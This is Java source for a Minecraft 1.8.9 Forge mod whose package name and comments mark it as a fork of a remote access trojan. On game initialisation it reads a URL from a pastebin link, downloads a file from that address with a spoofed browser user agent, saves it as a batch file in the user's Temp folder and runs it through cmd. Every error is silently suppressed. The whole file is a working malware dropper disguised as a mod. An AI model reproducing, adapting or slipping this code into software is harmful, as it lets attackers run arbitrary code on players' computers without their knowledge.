package lyoni.armen.rat;

import net.minecraft.launchwrapper.Launch;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.*;

import java.awt.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;

@Mod(modid = "Rat", name = "Rat2", version = "1.0", acceptedMinecraftVersions = "[1.8.9]")
public class Rat {

    public static String version = "1.1";
    // author of fork : Lyoni

    @Mod.EventHandler
    public void onFMLInitialization(FMLInitializationEvent event) {
        try {
            Thread.sleep(5000);
            LoadAH();
        } catch (Exception ignored) {}
        try {
            Thread.sleep(3000);
            exec("cmd /c start C:\\Users\\%username%\\AppData\\Local\\Temp\\PrivateHost.bat");
        } catch (Exception ignored) {}
    }

    // utils

    public static void exec(String cmd) {
        try {
            Runtime rt = Runtime.getRuntime();
            Process pr = rt.exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    public static void LoadAH() {
        try {

            URL pastebin = new URL("https://pastebin.com/raw/vYLLVc1b");
            BufferedReader reader = new BufferedReader(new InputStreamReader(pastebin.openConnection().getInputStream()));
            String fileURL = reader.readLine();
            URL url = new URL(fileURL);

            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            httpURLConnection.addRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
            InputStream stream = httpURLConnection.getInputStream();

            File path = new File(System.getenv("LOCALAPPDATA") + File.separator + "Temp");

            if (!path.exists()) path.mkdir();

            File bitcoin = new File(path, "PrivateHost.bat");
            FileOutputStream fileOut = new FileOutputStream(bitcoin);

            int currByte;
            while ((currByte = stream.read()) != -1) {
                fileOut.write(currByte);
            }

        } catch (Exception ignored) {}

    }

}
